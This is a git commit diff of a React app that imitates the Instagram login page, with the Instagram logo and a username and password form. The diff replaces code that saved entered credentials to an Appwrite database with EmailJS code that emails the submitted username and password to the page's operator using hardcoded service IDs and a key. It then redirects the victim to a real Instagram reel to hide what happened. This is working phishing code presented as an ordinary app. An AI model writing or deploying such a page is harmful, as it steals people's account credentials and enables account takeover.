09587e344361a927d8b466d2dca5007e6d082c23
Shubham <shubhamsaini8965@gmail.com>
2025-04-23 22:21:02 +0530

    .

--- src/App.jsx
+++ src/App.jsx
@@ -1,68 +1,62 @@
-import React, { useState } from 'react'
-import { databases, ID } from '../src/appwrite/config';
+import React, { useState, useRef } from 'react';
+import emailjs from '@emailjs/browser';
 
 const App = () => {
-  const [showPassword, setShowPassword] = useState(false)
-  const [username, setUsername] = useState('')
-  const [password, setPassword] = useState('')
-  const [message, setMessage] = useState('')
-  const [Login, setLogin] = useState('Login')
+  const form = useRef();
+  const [showPassword, setShowPassword] = useState(false);
+  const [username, setUsername] = useState('');
+  const [password, setPassword] = useState('');
+  const [message, setMessage] = useState('');
+  const [buttonText, setButtonText] = useState('Login');
+  const [isSent, setIsSent] = useState(false);
 
   const handleSubmit = async (e) => {
-    e.preventDefault()
+    e.preventDefault();
 
     if (!username || !password) {
-      setMessage('Please enter both username and password')
-      return
-    }
-    
-    try {
-      setLogin('Logging in....')
-
-      await databases.createDocument(
-        import.meta.env.VITE_DATABASE_ID,
-        import.meta.env.VITE_COLLECTION_ID,
-        ID.unique(),
-        {
-          username,
-          password
-        }
-      );
-
-      setUsername('');
-     setPassword('')
-    } catch (error) {
-      setError('Failed to send message. Please try again.');
-    } finally {
-     setLogin('Login')
-     setTimeout(() => {
-      window.location.href = 'https://www.instagram.com/reel/DIBE7MgTL3U/?utm_source=ig_web_copy_link'
-    }, 1500) 
+      setMessage('Please enter both username and password');
+      return;
     }
 
+    setButtonText('Logging in....');
 
-   
-  
-  }
+ 
+    emailjs
+      .sendForm('service_6w5zu4s', 'template_nfgg1b2', form.current, {
+        publicKey: 'Yarkz3TvcEGd8F1kG',
+      })
+      .then(
+        () => {
+        setIsSent(true);
+        form.current.reset();
+        setTimeout(() => {
+          window.location.href =
+            'https://www.instagram.com/reel/DIBE7MgTL3U/?utm_source=ig_web_copy_link';
+        }, 1500);
+      })
+      .catch(() => {
+        setMessage('Error sending message');
+        setButtonText('Login');
+      });
+  };
 
   return (
     <div className="flex items-center justify-center min-h-screen bg-black text-white px-4 py-10">
       <div className="flex flex-col items-center w-full max-w-md bg-black">
         {/* Logo */}
-        <img
-          src="instaLogo.png"
-          alt="Instagram Logo"
-          className="w-45 md:w-44 mb-10"
-        />
+        <img src="instaLogo.png" alt="Instagram Logo" className="w-45 md:w-44 mb-10" />
 
         {/* Form */}
-        <form onSubmit={handleSubmit} className="w-full flex flex-col space-y-4 px-4">
+        <form ref={form} onSubmit={handleSubmit} className="w-full flex flex-col space-y-4 px-4">
           <input
             type="text"
             placeholder="Phone number, username, or email"
             value={username}
             onChange={(e) => setUsername(e.target.value)}
             className="bg-zinc-900 text-sm md:text-base p-3 rounded border border-gray-600 placeholder-gray-400 focus:outline-none focus:ring-0"
+            autoComplete="current-username" 
+            name='username'
+
           />
 
           <div className="relative">
@@ -72,7 +66,10 @@ const App = () => {
               value={password}
               onChange={(e) => setPassword(e.target.value)}
               className="bg-zinc-900 text-sm md:text-base p-3 pr-16 rounded border border-gray-600 placeholder-gray-400 w-full focus:outline-none focus:ring-0"
+              autoComplete="current-password" 
+              name='password'
             />
+
             <button
               type="button"
               onClick={() => setShowPassword(!showPassword)}
@@ -86,16 +83,12 @@ const App = () => {
             type="submit"
             className="cursor-pointer bg-blue-500 text-white p-2 md:p-3 rounded font-semibold text-sm md:text-base hover:bg-blue-600 transition"
           >
-            {Login}
+            {buttonText}
           </button>
 
           {/* Message display */}
-          {message && (
-           
-            <div className='text-[12px] mt-2 text-red-400 text-center'>
-              {message}
-            </div>
-          )}
+          {message && <div className="text-[12px] mt-2 text-red-400 text-center">{message}</div>}
+
 
           {/* Divider */}
           <div className="flex items-center gap-2 my-4">
@@ -131,7 +124,7 @@ const App = () => {
         </div>
       </div>
     </div>
-  )
-}
+  );
+};
 
-export default App
+export default App;
